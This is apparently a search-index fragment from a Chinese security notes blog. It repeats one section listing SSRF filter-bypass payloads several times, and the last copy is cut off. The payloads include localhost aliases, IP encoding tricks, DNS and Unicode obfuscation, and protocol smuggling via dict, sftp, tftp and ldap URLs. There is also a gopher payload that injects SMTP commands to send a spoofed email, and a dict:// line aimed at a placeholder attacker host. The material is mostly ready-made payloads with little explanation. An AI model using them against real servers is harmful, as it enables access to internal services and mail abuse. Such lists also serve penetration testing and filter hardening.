","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#4利用短地址"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#5利用特殊域名"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#6利用dns解析"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#7利用上传"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#8利用enclosed-alphanumerics"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#9利用句号"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#10利用进制转换"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// 